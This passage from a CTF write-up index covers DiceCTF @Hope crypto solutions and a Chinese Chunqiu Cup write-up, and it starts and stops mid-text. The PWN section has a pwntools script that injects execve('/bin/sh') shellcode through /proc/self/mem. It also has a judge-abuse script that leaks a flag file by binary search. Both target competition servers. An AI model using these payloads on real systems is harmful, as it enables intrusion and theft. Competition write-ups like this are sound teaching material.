S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)), mklist!(AddFunc, Flag6, Flag22, mkout!(Add, mkout!(Mul, Ten, S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;), S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;S&lt;Z&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;)));\nfn print_flag() { println!(\"dice{{{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}}}\", Flag0::CHAR, Flag1::CHAR, Flag2::CHAR, Flag3::CHAR, Flag4::CHAR, Flag5::CHAR, Flag6::CHAR, Flag7::CHAR, Flag8::CHAR, Flag9::CHAR, Flag10::CHAR, Flag11::CHAR, Flag12::CHAR, Flag13::CHAR, Flag14::CHAR, Flag15::CHAR, Flag16::CHAR, Flag17::CHAR, Flag18::CHAR, Flag19::CHAR, Flag20::CHAR, Flag21::CHAR, Flag22::CHAR, Flag23::CHAR, Flag24::CHAR); }\n\ntype NConstraints = mklist!(ApplyFunc, MapFunc, mklist!(ConsFunc, MkNConstraint, mkcons!(FirstOf3, Constraints)));\ntype EConstraints = mklist!(ApplyFunc, MapFunc, mklist!(ConsFunc, MkConstraint, mkcons!(RestOf3, Constraints)));\ntype Program = mklist!(GetLast, mklist!(ApplyFunc, GetLast, NConstraints), mklist!(ApplyFunc, GetLast, EConstraints));\ntype Fin = mkout!(Eval, Program);\n\nfn main() {\n    print_flag();\n    let _: Fin = panic!();\n}\n</code></pre> <p>It essentially creates a lisp-like language, and a list of 60 constraints. The constraints are of the form <code>(flag[i] op flag[j]) cmp x</code>, where <code>op</code> is addition, subtraction, or multiplication, and <code>cmp</code> is either equality or inequality. Every 3rd constraint is inequality and the rest are equality.</p>"},{"location":"Writeup/DiceCTF%20Hope/","title":"DiceCTF 2022 @Hope Writeup","text":"<p>DiceCTF @Hope is a nice competition, I worked with Frankss and Monad to solve the challenges. Our final rank is #21.</p> Categories Solved Writeup crypto 6/8 jump misc 5/8 TBA pwn 3/5 TBA rev 5/11 TBA web 7/10 TBA"},{"location":"Writeup/DiceCTF%20Hope/#crypto","title":"Crypto","text":""},{"location":"Writeup/DiceCTF%20Hope/#obp","title":"obp","text":"<p>The unbreakable One Byte Pad</p> <p>by BrownieInMotion</p> <p>The given python script uses One Time Pad to encrypt the message. However, the perfectly security of the OTP only happens when the length of the key is as the same as the plaintext.</p> <pre><code>import random\n\nwith open('flag.txt', 'rb') as f:\n    plaintext = f.read()\n\nkey = random.randrange(256)\nciphertext = [key ^ byte for byte in plaintext]\n\nwith open('output.txt', 'w') as f:\n    f.write(bytes(ciphertext).hex())\n</code></pre> <p>In this scenario, using only one byte key can be decrypted with brute force in possibility polynomial time (PPT). I used Cyberchef for xor brute force.</p> <p></p> <p>The correct key is 0xd2.</p>"},{"location":"Writeup/DiceCTF%20Hope/#pem","title":"pem","text":"<p>PEM stands for Prime Encryption Method, I think.</p> <p>by ireland</p> <p>The given python code accidently output the private key instead of the public key. We can use PKCS1_OAEP decrypt by loading the given private key.</p> <pre><code>from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\n\nwith open('flag.txt','rb') as f:\n    flag = f.read()\n\nkey = RSA.generate(2048)\ncipher_rsa = PKCS1_OAEP.new(key)\nenc = cipher_rsa.encrypt(flag)\n\nwith open('privatekey.pem','wb') as f:\n    f.write(key.export_key('PEM'))\n\nwith open(\"encrypted.bin\", \"wb\") as f:\n    f.write(enc)\n</code></pre> <p>The payload as follow:</p> <pre><code>&gt;&gt;&gt; from Crypto.Cipher import PKCS1_OAEP\n&gt;&gt;&gt; from Crypto.PublicKey import RSA\n&gt;&gt;&gt; ciphertext = open('encrypted.bin', 'rb').read()\n&gt;&gt;&gt; key = RSA.importKey(open('privatekey.pem').read())\n&gt;&gt;&gt; cipher = PKCS1_OAEP.new(key)\n&gt;&gt;&gt; print(cipher.decrypt(ciphertext))\nb'hope{crypto_more_like_rtfm_f280d8e}'\n</code></pre>"},{"location":"Writeup/DiceCTF%20Hope/#kfb","title":"kfb","text":"<p>if keys make stuff secure then why don't we use them more</p> <p>nc mc.ax 31968</p> <p>by kfb</p> <p>The given python code reads the flag file, and encrypted it with AES ECB mode with a key length of 16 bytes.</p> <pre><code>#!/usr/local/bin/python -u\n\nfrom Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Util.strxor import strxor\nfrom more_itertools import ichunked\n\nBLOCK = AES.block_size\nFLAG = open('flag.txt', 'rb').read().strip()\n\ndef encrypt_block(k, pt):\n  cipher = AES.new(k, AES.MODE_ECB)\n  return cipher.encrypt(pt)\n\ndef encrypt(k, pt):\n  assert len(k) == BLOCK\n  pt = pad(pt, BLOCK)\n  ct = b''\n  for bk in ichunked(pt, BLOCK):\n    ct += strxor(encrypt_block(k, k), bytes(bk))\n  return ct\n\ndef main():\n  k = get_random_bytes(BLOCK)\n  enc = encrypt(k, FLAG)\n  print(f'&gt; {enc.hex()}')\n\n  pt = bytes.fromhex(input('&lt; '))[:BLOCK]\n  enc = encrypt(k, pt)\n  print(f'&gt; {enc.hex()}')\n\nif __name__ == '__main__':\n  main()\n</code></pre> <p>The same key is then used to encrypt a user given hex message, the maximum length of this message is 32 bytes.</p> <p>The solution is simple: gives an all 0s message, the encrypted ciphertext is as the same as the key, as the ECB mode simply xor the key and the message blocks. Here's an external link for ECB mode: Wikipedia ECB Mode.</p> <p>For example, the server gives me ciphertext <code>cb98a2eab4b86597f93a1e046bfd88e2d083bbeca48c779af93a021e78f7b3d5c6a8b9e1a0a470aac47a455e26f58e8ac6cfeabcaab736c1db4e71 6c1996ebba</code>. I divided them into 4 blocks, 16 bytes (32 hex characters) per block:</p> <pre><code>cb98a2eab4b86597f93a1e046bfd88e2\nd083bbeca48c779af93a021e78f7b3d5\nc6a8b9e1a0a470aac47a455e26f58e8a\nc6cfeabcaab736c1db4e716c1996ebba\n</code></pre> <p>Then padding 0s into server, the response (key) is <code>a3f7d28fcfd303f5a649766b1e91ecbdb3e7c29fdfc313e5b659667b0e81fcad</code>. Use this key for each block, find the flag:</p> <pre><code>hope{kfb_should_\nstick_to_stuff_h\ne_knows_b3358db7\ne883ed54}.......\n</code></pre>"},{"location":"Writeup/DiceCTF%20Hope/#despicable-you","title":"DESpicable you","text":"<p>I've told my minions to brew up a new type of block cipher! (written in python 2.7)</p> <p>by greenbeans</p> <p>The given python code seems to be secure. It generates random key, and encrypt the message with 8 byte block.</p> <p>The first problem is the <code>rekey</code> function. If you test this function, you would find out that the key doesn't change after the <code>rekey</code>. The string in python is passed to the function with only value instead of address, change the value in <code>rekey</code> for <code>key</code> doesn't affect the caller's <code>key</code>.</p> <pre><code>from os import urandom\n\ndef encipher(a,b):\n    c = ''\n    for i, j in zip(a,b):\n        c+=chr(ord(i)^ord(j))\n    return c\n\ndef rekey(key):\n    k = \"\"\n    for i,c in enumerate(key):\n        if i == len(key)-1:\n            k += c\n            k += chr(ord(c)^ord(key[0]))\n        else:\n            k += c\n            k += chr(ord(c)^ord(key[i+1]))\n    key = k\n\ndef main():\n    key = urandom(8)\n\n    with open('flag.txt') as f:\n        plaintext = f.read()\n\n    i = 0\n    ct = ''\n    while i &lt; len(plaintext):\n        ct += encipher(plaintext[i:i+len(key)],key)\n        i += len(key)\n        rekey(key)\n    f2 = open('output.txt', 'w')\n    f2.write(ct)\n    f2.close()\n\nmain()\n</code></pre> <p>The second problem is the prefix of the plaintext, we already known, is the <code>hope{'</code>. Using this plaintext, we can find out the first 5 bytes of the key is <code>88 15 03 8d 50</code>.</p> <p>Another knowledge we have is the characters in the plaintext should be all printable characters. Thus, we brute force the every 6th/7th/8th byte in blocks. The only valid case is that the xor result gives only printable characters.</p> <p>Only the 5th byte has multiple possible key values. But with some practice, we can find the last 3 bytes of the key are <code>6e c1 61</code>.</p> <p>The final flag is: <code>hope{maybe_1_sh0ulD_h4v3_h1R3d_4_5p3c1471st_5tgkjs3bgRh}</code>.</p>"},{"location":"Writeup/DiceCTF%20Hope/#replacement","title":"replacement","text":"<p>Oh no, my light reading got all mixed up!</p> <p>by BrownieInMotion</p> <p>Cipher python code is very simple, only shuffles all the characters in the plaintext.</p> <pre><code>import random\n\nwith open('text.txt') as f:\n    plaintext = f.read()\n\nwith open('flag.txt') as f:\n    plaintext += '\\n' + f.read()\n\ncharacters = set(plaintext) - {'\\n'}\n\nshuffled = list(characters)\nrandom.shuffle(shuffled)\n\nreplacement = dict(zip(characters, shuffled))\n\nciphertext = ''.join(replacement.get(c, c) for c in plaintext)\n\nwith open('output.txt', 'w') as f:\n    f.write(ciphertext)\n</code></pre> <p>Notice that blanks are shuffled as well. Luckily, the new liners are stayed the same. We can have the following ciphertext:</p> <pre><code>oiqsygh\"dg\"g}y__\"Mygkwg_ySdB\nbxgh\"Vyg\"g}y__\"Mygkwg_ySdbrg_hyg\"SSwlSsydgwVy.gkhygfljiqsgsh\"SSyi_BgnVyrg hwg\"i \"t_gf\"qdgy,sy__qVyg\"kkySkqwSgkwgyVy.tkhqSMgoiqsyg_\"qdrgkhwlMhkgkh\"kgkhq_g_wlSdydgqSky.y_kqSMrg\"Sdg.y_wiVydgkwg.y\"dgkhyg}y__\"MyB\nbxg_h\"iig_ySdgqkgkwgawjgqSgkhyg}w_kgswSVwilkydg \"tgfw__qjiyrbgy,fwlSdydgoiqsygcl.khy.rgbl_qSMg\"g}q,kl.ygwcgf.qV\"kyg\"Sdgfljiqsgsh\"SSyi_g\"_g yiig\"_gEytgqScw.}\"kqwSg_ySkgjtgk.l_kydgswl.qy.b\nnVygcwlSdgkhq_gk\"iEgwcgy,syfkqwS\"igsw}fiqs\"kqwSgy,k.y}yitgqSk.qMlqSMBgvy\"S hqiyrgawjgMwkghq}_yicg\"g_\"Sd qshB\nbxkg_h\"iigjyg\"My_gtykgjycw.ygoiqsyg_ySd_g}yghy.g}y__\"Myrgcw.g_hyg}l_kgySswdygqkgqSgkhyg}w_kgswSVwilkydg \"tgfw__qjiyBgxSg\"ddqkqwSrgqkgq_giq\"jiygkwgjygdliigkwg.y\"dgyVySgwSsygdysqfhy.ydbgkhwlMhkgawjBgbmyswSditrgdysqfhy.qSMgqkgq_gMwqSMgkwgjyg\"ghy\"d\"shyBbg{hy.ycw.ygawjg}\"dyghq}_yicg\"gslfgwcgky\"gkwgMwg qkhghq_g_\"Sd qshB\n\nOq\"g\"gsw}fiy,g_y.qy_gwcgdq_Mlq_y_g\"Sdgkhygl_ygwcgsiyVy.gkyshSwiwMtgkwg_\"}fiygqScw.}\"kqwSgc.w}g\"iiyMyditg_ysl.ygsh\"SSyi_rgnVyg.yswVy.ydg\"gc.\"skqwSgwcgkhyg}y__\"Myg\"SdgwcgkhygEytBgatg\"ffitqSMg\"iigwcghy.gswS_qdy.\"jiygqSkyiiqMySsyg\"Sdg\"ghqdywl_gel\"Skqktgwcgsw}flk\"kqwS\"igfw y.rg_hyg \"_g\"jiygkwg.yswVy.gkhygfi\"qSky,krg.yswdyg\"g}y__\"Myg\"Sdgf\"__gqkgwSgkwgawjg\"_gqcgSwkhqSMgh\"dgh\"ffySydBgpSitgkhySgdqdg_hyg\"skl\"iitg.y\"dgkhygfi\"qSky,kB\n\nhwfyASwkTkhyTM.y\"ky_kT_ qkshy.wwTqjf_S,tjEyS\"i,}cSdIccd_u\n</code></pre> <p>Using brute force is unacceptable. However, we can take it a bite from the new liners. We can have the first guess:</p> <ul> <li>Almost all the previous character from the new liners are <code>.</code> (dots).</li> </ul> <p>With this assumption, we can quickly jump to the second:</p> <ul> <li>Almost all the dots should be followed with a <code></code> (blank).</li> </ul> <p>Then, starts from the blanks, we have another assumption:</p> <ul> <li>Almost all the blanks should after some punctuations like <code>,</code> (commas).</li> </ul> <p>Now, we guess the last line should be flag. We can guess:</p> <ul> <li>In the most scenarios, only the flag can contain <code>_</code> (underlines), <code>{}</code> (open and close braces).</li> </ul> <p>Now, we already have enough information to run a A*-like search in substitution cipher. We can decrypt most of the characters in an ignored-case search. The only problem is some special characters:</p> <ul> <li><code>\"</code> (quotations): should be presents in the beginning of a word or after/before a punctuation. Otherwise, in the end of a line.</li> <li><code>Alice, Bob, Eve</code>: special names in the cryptography, should be useful for alphabet character replacements.</li> <li><code>Uppercase alphabets</code>: only shows a few times, shouldn't be a problem.</li> </ul> <p>OK, now we have mostly ciphertext decrypted. However, the flag is not correct. What's the key point? The problem is the special character only presents once in the flag, this is the last cipher replacement. Find the last and the only reflection we haven't used: <code>I -&gt; j</code>.</p> <p>Finally, we find the plaintext:</p> <pre><code>Alice had a message to send.\n\"I have a message to send\", she announced over the public channels. Eve, who always paid excessive attention to everything Alice said, thought that this sounded interesting, and resolved to read the message.\n\"I shall send it to Bob in the most convoluted way possible,\" expounded Alice further, \"using a mixture of private and public channels as well as key information sent by trusted courier\"\nEve found this talk of exceptional complication extremely intriguing. Meanwhile, Bob got himself a sandwich.\n\"It shall be ages yet before Alice sends me her message, for she must encode it in the most convoluted way possible. In addition, it is liable to be dull to read even once deciphered\" thought Bob. \"Secondly, deciphering it is going to be a headache.\" Therefore Bob made himself a cup of tea to go with his sandwich.\n\nVia a complex series of disguises and the use of clever technology to sample information from allegedly secure channels, Eve recovered a fraction of the message and of the key. By applying all of her considerable intelligence and a hideous quantity of computational power, she was able to recover the plaintext, recode a message and pass it on to Bob as if nothing had happened. Only then did she actually read the plaintext.\n\nhope{not_the_greatest_switcheroo_ibpsnxybkenalxmfndjffds}\n</code></pre>"},{"location":"Writeup/DiceCTF%20Hope/#reverse-rsa","title":"reverse-rsa","text":"<p>I'll tell you my flag if you can prove you already know it!</p> <p>nc mc.ax 31669</p> <p>by ireland</p> <p>This is a static res public-private key generation problem. The python code only checks the flag format in the plaintext, maybe, in some practice, we can construct a key pair, to make the <code>hope{.*}</code> presents in the plaintext.</p> <pre><code>#!/usr/local/bin/python\n\nimport re\nfrom Crypto.Util.number import isPrime, GCD\n\nflag_regex = rb\"hope{[a-zA-Z0-9_\\-]+}\"\n\nwith open(\"ciphertext.txt\", \"r\") as f:\n    c = int(f.read(), 10)\n\nprint(f\"Welcome to reverse RSA! The encrypted flag is {c}.  Please provide the private key.\")\n\np = int(input(\"p: \"), 10)\nq = int(input(\"q: \"), 10)\ne = int(input(\"e: \"), 10)\n\nN = p * q\nphi = (p-1) * (q-1)\n\nif (p &lt; 3) or not isPrime(p) or (q &lt; 3) or not isPrime(q) or (e &lt; 2) or (e &gt; phi) or GCD(p,q) &gt; 1 or GCD(e, phi) != 1:\n    print(\"Invalid private key\")\n    exit()\n\n\nd = pow(e, -1, phi)\nm = pow(c, d, N)\n\nm = int.to_bytes(m, 256, 'little')\nm = m.strip(b\"\\x00\")\n\nif re.fullmatch(flag_regex, m) is not None:\n    print(\"Clearly, you must already know the flag!\")\n\n    with open('flag.txt','rb') as f:\n        flag = f.read()\n        print(flag.decode())\n\nelse:\n    print(\"hack harder\")\n</code></pre> <p>This post claims this problem: construct private / public keys.</p> <p>Here's an example solution:</p> <pre><code>p = 18237507977115134399\nq = 13539415005905881139\ne = 201049869065984997914383873658228289079\n</code></pre> <p>We can find the flag finally: <code>hope{successful_decryption_doesnt_mean_correct_decryption_0363f29466b883edd763dc311716194d37dff5cd93cd4f1b4ac46152f4f9}</code></p>"},{"location":"Writeup/2022cqb3/wp/","title":"2022\u5e74\u6625\u79cb\u676f\u7f51\u7edc\u5b89\u5168\u8054\u8d5b-\u51ac\u5b63\u8d5b-WP","text":"<p><code>By Frankss</code> <code>Rank: 1</code> <code>Solved: 10</code></p> <ul> <li>2022\u5e74\u6625\u79cb\u676f\u7f51\u7edc\u5b89\u5168\u8054\u8d5b-\u51ac\u5b63\u8d5b-WP</li> <li>Misc [AK]<ul> <li>reindeer game</li> <li>\u6960\u4e4b\u52c7\u8005\u4f20</li> <li>\u95ee\u5377</li> <li>nan's analysis</li> </ul> </li> <li>PWN<ul> <li>work_pwn</li> <li>online_judge</li> </ul> </li> <li>RE [AK]<ul> <li>godeep</li> <li>easy_python [\u4e09\u8840]</li> <li>baby_transform [\u4e09\u8840]</li> </ul> </li> <li>Web<ul> <li>ezphp</li> </ul> </li> </ul> <p>\u975e\u5e38\u5e78\u8fd0\u5730\u6478\u4e86\u4e00\u4e2a\u70ab\u9177\u7684\u540d\u6b21\uff0c\u8bda\u60f6\u8bda\u6050 </p>"},{"location":"Writeup/2022cqb3/wp/#misc-ak","title":"Misc [AK]","text":""},{"location":"Writeup/2022cqb3/wp/#reindeer-game","title":"reindeer game","text":"<p>pyinstaller\u89e3\u5305\uff0c\u76f4\u63a5\u8c03pyc\u91cc\u751f\u6210flag\u7684\u51fd\u6570\uff1a  </p>"},{"location":"Writeup/2022cqb3/wp/#_1","title":"\u6960\u4e4b\u52c7\u8005\u4f20","text":"<p>\u8f7b\u677e\u62ff\u5230\u9b54\u6cd5\u68d2\uff0c\u7136\u540e\u6309\u63d0\u793a\u53bb <code>/proc/self/mem</code> \u627e\u5730\u65b9\u5199sc \u81ea\u5df1\u5f00\u4e86\u4e2a\u73af\u5883\u770b\u4e00\u4e0bnobody\u8dd1\u7684python36\u5c45\u7136\u662f\u6ca1\u968f\u673a\u5316\u5730\u5740\u7684\uff0c\u7136\u540e\u672c\u5730\u504f\u79fb\u901a\u4e86\u8fdc\u7a0b\u4e0d\u8fc7\uff08\u7248\u672c\u662f\u4e00\u6837\u7684\uff09 \u4e8e\u662f\u8fdc\u7a0b\u5148\u6309<code>0x1000</code>\u52a0\u504f\u79fb\uff0c\u5361\u6b7b\u4e86\u5c31\u9010byte\u52a0\uff0c\u7136\u540e\u5c31\u6210\u529f\u6267\u884c\u5230\u4e86shellcode  </p> <pre><code>from pwn import *\n\nfor off in range(3, 0x100):\n    p = remote(\"39.106.48.123\", 28287)\n    context.log_level = 'debug'\n    p.sendline(b\"1\")\n    p.sendlineafter(b\"&gt;&gt; \", b\"1\")\n    for _ in range(10):\n        p.sendlineafter(b\"&gt;&gt; \", b\"4\")\n        p.sendlineafter(b\"Enter\", b\"\")\n    p.sendlineafter(b\"&gt;&gt; \", b\"3\")\n    p.sendlineafter(b\"&gt;&gt; \", b\"1\")\n    p.sendline(b\"a\")\n    p.sendlineafter(b\"Enter\", b\"\")\n    p.sendlineafter(b\"&gt;&gt; \", b\"2\")\n    p.sendlineafter(b\"&gt;&gt; \", b\"1\")\n    p.sendline(b\"../proc/self/mem\")\n    p.sendline(str(0x5b9a10+off).encode())\n    p.sendline(base64.b64encode(b'jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05'))\n    p.interactive()\n</code></pre>"},{"location":"Writeup/2022cqb3/wp/#_2","title":"\u95ee\u5377","text":"<p>\u95ee\u5377</p>"},{"location":"Writeup/2022cqb3/wp/#nans-analysis","title":"nan's analysis","text":"<p>\u56fe\u7247..\u6ca1\u4ec0\u4e48\u7528 \u538b\u7f29\u5305\uff0c\u6709\u5bc6\u7801\uff0c\u4f46\u5176\u5b9e\u5c31\u662f\u5220\u4e86root\u5bc6\u7801\u7684shell\uff0c\u5e26\u56de\u8f66..\u4e5f\u6ca1\u4ec0\u4e48\u7528  \u552f\u4e00\u6709\u7528\u7684\u662fFTP\u7684\u5bc6\u7801\uff0c\u662fAES\u7684key iv\u731c\u4e86\u597d\u4e45\uff0c\u6700\u540e\u7528UTF8\u768416\u4e2a0\u641e\u51fa\u6765\u770b\u8d77\u6765\u5f88\u5bf9\u7684\u5b57\u7b26\uff0c\u4f46\u957f\u5ea6\u4e0d\u5bf9 \u7136\u540e\u75280504\u91cd\u590d4\u6b21\u505aIV\u5f97\u5230\u4e86\u6b63\u786e\u7684root\u5bc6\u7801  </p> <p>shell\u7684\u4f4d\u7f6els -la\u5bf9\u6bd4\u51e0\u4e0b\u5c31\u627e\u5230\u4e86 </p>"},{"location":"Writeup/2022cqb3/wp/#pwn","title":"PWN","text":""},{"location":"Writeup/2022cqb3/wp/#work_pwn","title":"work_pwn","text":"<p>\u6709\u4e00\u79d2\u949f\u7684\u65f6\u95f4\u7b49\u5f85\u7ebf\u7a0b\uff0c\u5728\u4e00\u79d2\u4e4b\u5185\u6539\u5168\u5c40\u53d8\u91cf\u5c31\u884c\u4e86  </p> <pre><code>from pwn import *\n\np = remote(\"39.105.171.73\", 18791)\n\ncontext.log_level = 'debug'\np.sendlineafter(b\"&gt;&gt;&gt;\", b\"3\")\np.sendlineafter(b\"###\", b\"1\")\np.sendlineafter(b\"&gt;&gt;&gt;\", b\"1\")\np.sendlineafter(b\"///\", b\"1\")\np.sendlineafter(b\" :\", b\"/flag\")\np.sendlineafter(b\"Leaving a message :\", b\"1\")\nwhile True:\n    p.recv()\n</code></pre>"},{"location":"Writeup/2022cqb3/wp/#online_judge","title":"online_judge","text":"<p>\u6ca1\u6709\u6267\u884c\u6743\u9650\uff0c\u6587\u4ef6\u7cfb\u7edf\u53ea\u8bfb \u4e8c\u5206\u53ef\u4ee5\u5077\u4e1c\u897f\u51fa\u6765\uff08AC, WA) \u4e00\u5f00\u59cb\u4e0d\u77e5\u9053<code>/flag</code>\u662f\u76ee\u5f55\uff0c\u75db\u5931\u4e00\u8840 \u6253\u4e86\u4e00\u5806\u4e1c\u897f\u51fa\u6765\uff0c\u751a\u81f3\u628a\u73af\u5883\u53d8\u91cf\u90fd\u5077\u4e86\u51fa\u6765  </p> <pre><code>import os\nimport sys\nimport requests\n\nhost, port = '47.104.129.38', 10101\nbase_url = f'http://{host}:{port}'\ntoken_url = f'{base_url}/getToken'\njudge_url = f'{base_url}/judge'\n\n\ndef getToken():\n    result = requests.post(token_url).json()\n    assert not result['error'], \"System error\"\n    return result['data']['token']\n\n\ntoken = getToken()\n\n\ndef judge(chall: str, src: str, language: str = 'C'):\n    data = {\n        'src': src,\n        'language': language,\n        'action': chall,\n        'token': token,\n    }\n    result = requests.post(judge_url, json=data).json()\n    return 'SUCCESS' in result['data']\n\n\nl = ['etc', 'usr', 'sbin', 'lib64', 'home', 'dev', 'boot', 'root', 'sys', 'proc', 'opt', 'mnt', 'var', 'srv', 'lib',\n     'run', 'media', 'bin', 'tmp', 'test_case', 'flag', 'log', 'judger', '.dockerenv', 'code']\nk = ['unbuffer.so', '__init__.py', 'compiler.py', 'unbuffer.c', '.python-version', 'utils.py', 'entry']\np = ['compile.log', 'gunicorn.log', 'judge_server.log', 'judger.log']\no = 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin PYTHONIOENCODING=UTF-8 LANG=en_US.UTF-8 LANGUAGE=en_US:en LC_ALL=en_US.UTF-8'\nu = '/usr/bin/python3 /judger/run/165\\SVAbYV734P3=\\A14VQ6]P7CH47MW/__pycache__/solution.cpython-36.pyc'\nflag = \"\"\"'\"\"\"\n\nfor i in range(len(flag) - 1, 500):\n    min = 32\n    max = 128\n    while 1:\n        j = min + (max - min) // 2\n        if min == j:\n            flag += chr(j)\n            print(flag)\n            break\n        res = judge('test', f\"\"\"import os\na,b = map(int,input().split(' '))\nr=open(\"/flag/flag\").read()\nif ord(r[{i}])&lt;{j}:\n    print(a+b)\nelse:\n    print(a+b+1)\n\"\"\", 'PYTHON')\n        if res:\n            max = j\n        else:\n            min = j\n</code></pre>"},{"location":"Writeup/2022cqb3/wp/#re-ak","title":"RE [AK]","text":""},{"location":"Writeup/2022cqb3/wp/#godeep","title":"godeep","text":"<p>\u81ea\u52a8\u5316\u9006\u5411\u73b0\u5728\u5927\u5bb6\u90fd\u4f1a\u4e86\uff08\u597d\u591a\u89e3\uff09 \u8fd9\u91cc\u547d\u540d\u662f<code>IDA7.7</code>\u81ea\u52a8\u6539\u7684\uff0c7.7\u6bd47.5\u5bf9go\u7684\u652f\u6301\u597d\u4e86\u5f88\u591a <code>'godeep_tree.VSWEwsr'</code>\u662f<code>right</code>\u8f93\u51fa\u7684\u51fd\u6570 <code>'godeep_tree.ApSzXJOjiFA'</code>\u662fmain\u91cc\u5f00\u59cb\u7684\u51fd\u6570 \u6309if\u7684\u5185\u5bb901\u4e00\u4e0b\uff0c\u7136\u540e\u628a01\u4e32\u53cd\u8fc7\u6765\u5c31\u662fflag    </p> <pre><code>name = 'godeep_tree.VSWEwsr'\nr=\"\"\nwhile name != 'godeep_tree.ApSzXJOjiFA':\n    print(name, end = \", \")\n    func = idaapi.get_func(get_name_ea_simple(name)) \n    ea = func.start_ea\n    ref = CodeRefsTo(ea, 1)\n    fun = next(ref)\n    code = str(idaapi.decompile(fun))\n    a, b = code.split('else')\n    if name.split(\".\")[-1] in a:\n        r+=\"1\"\n    else:\n        assert name.split(\".\")[-1] in b\n        r+=\"0\"\n    name = re.findall(\"void __fastcall (.*?)\\(\",code)[0]\n    name = 'godeep_tree.' + name.split(\"_\")[-1]\n\nprint(name, end = \", \")\nprint()\nprint(bytes.fromhex(hex(eval(\"0B\"+r[::-1]))[2:]))\n</code></pre>"},{"location":"Writeup/2022cqb3/wp/#easy_python","title":"easy_python [\u4e09\u8840]","text":"<p>\u6b63\u5411\u8fd8\u539f\u5b57\u8282\u7801  </p> <pre><code>r = [204, 141, 44, 236, 111, 140, 140, 76, 44, 172, 7, 7, 39, 165, 70, 7, 39, 166, 165, 134, 134, 140, 204, 165, 7, 39,\n     230, 140, 165, 70, 44, 172, 102, 6, 140, 204, 230, 230, 76, 198, 38, 175]\n\nfor i in r:\n    c = i &gt;&gt; 5\n    d = i &lt;&lt; 3\n    print(chr((c | d) &amp; 0x7f), end='')\n</code></pre>"},{"location":"Writeup/2022cqb3/wp/#baby_transform","title":"baby_transform [\u4e09\u8840]","text":"<p>\u9274\u5b9a\u4e3a\u5085\u91cc\u53f6\u53d8\u6362\uff0c\u9006\u53d8\u6362\u662f\uff1a </p> <p>\u6b27\u62c9\u6b27\u62c9\u6b27\u62c9 $e^{(jx)}=cosx+jsinx$ \u7ed3\u675f</p> <pre><code>#include&lt;cstdio&gt;\n#include&lt;vector&gt;\n#include&lt;iostream&gt;\nusing namespace std;\n\n\nint  main() {\n    FILE* stream = fopen(\"flag.enc\", \"rb\");\n    char* flag = (char*)\"flag{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}\";\n    double* res = (double*)malloc(16 * 160);\n    double* ak = (double*)malloc(16 * 160);\n    fread(res, 1uLL, 16 * 42, stream);\n    for (int i = 0; i &lt; 42; ++i) {\n        double x = 0.0, y = 0.0;\n        for (int j = 0; j &lt; 42; j++) {\n            x += flag[j] * cos(j * (-6.283185307179586 * i) / 42);\n            y += flag[j] * sin(j * (-6.283185307179586 * i) / 42);\n        }\n        //res[2 * i] = y;\n       // res[2 * i + 1] = x;\n        ak[i] = (res[2 * i + 1] - res[2 * i]) / 42;\n    }\n\n    for (int i = 0; i &lt; 42; ++i) {\n        double x = 0.0, y = 0.0;\n        for (int j = 0; j &lt; 42; j++) {\n            x += ak[j] * cos(j * (-6.283185307179586 * i) / 42);\n            y += ak[j] * sin(j * (-6.283185307179586 * i) / 42);\n        }\n        cout &lt;&lt; (x + y) &lt;&lt; \" \";\n    }\n}\n</code></pre>"},{"location":"Writeup/2022cqb3/wp/#web","title":"Web","text":""},{"location":"Writeup/2022cqb3/wp/#ezphp","title":"ezphp","text":"<p>\u6211\u4e0d\u77e5\u9053php8\u6709\u4ec0\u4e48\u9b54\u6cd5\u7279\u6027\uff0c\u4f46\u6211\u77e5\u9053 $3 * 37 = 111$  \u7136\u540e\u4f20\u4e2a <code>?num=3*37</code> \u5c31..\u8fc7\u4e86 \u4e00\u5f00\u59cb\u60f3\u5230<code>0x</code>\u7136\u540e0\u88ab\u5899\u4e86\uff0c\u7136\u540e\u60f3\u903b\u8f91\u62fc\u63a5\uff0c<code>===</code>\u540e\u63a5\u4e2a<code>|2</code>\u4ec0\u4e48\u7684\uff0c\u7136\u540e\u5c31\u60f3\u5230\u4f4d\u8fd0\u7b97\uff0c\u4f46\u662f\u4f4d\u8fd0\u7b97\u957f\u5ea6\u4e0d\u592a\u591f\uff0c\u7136\u540e\u53bbfactordb\u627e\u4e58\u6cd5\u627e\u52303*37\uff0c\u56de\u6765\u65f6\u5019\u5df2\u7ecf3\u89e3\u4e86\uff0c\u5927\u5bb6\u79d2\u7684\u90fd\u597d\u5feb  </p>"},{"location":"Writeup/2022dfjk/readme/","title":"2022\u5dc5\u5cf0\u6781\u5ba2\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b-HED-WriteUp","text":"<p>Rank: 12 2149pts 5+71Solved <code>HED \u662f\u5357\u65b9\u79d1\u6280\u5927\u5b66COMPASS\u5b9e\u9a8c\u5ba4\u7684CTF\u6218\u961f</code></p> <ul> <li>2022\u5dc5\u5cf0\u6781\u5ba2\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b-HED-WriteUp</li> <li>Misc</li> <li>Lost 417pts 5sloves</li> <li>Crypto</li> <li>point power 125pt 61solves</li> <li>strange curve 104pt 78solves</li> <li>Web</li> <li>babyweb 173pt 39solves</li> <li>Re</li> <li>ObfPuzz\uff08\u4e8c\u8840\uff09400pt 6solves</li> </ul>"},{"location":"Writeup/2022dfjk/readme/#misc","title":"Misc","text":""},{"location":"Writeup/2022dfjk/readme/#lost-417pts-5sloves","title":"Lost 417pts 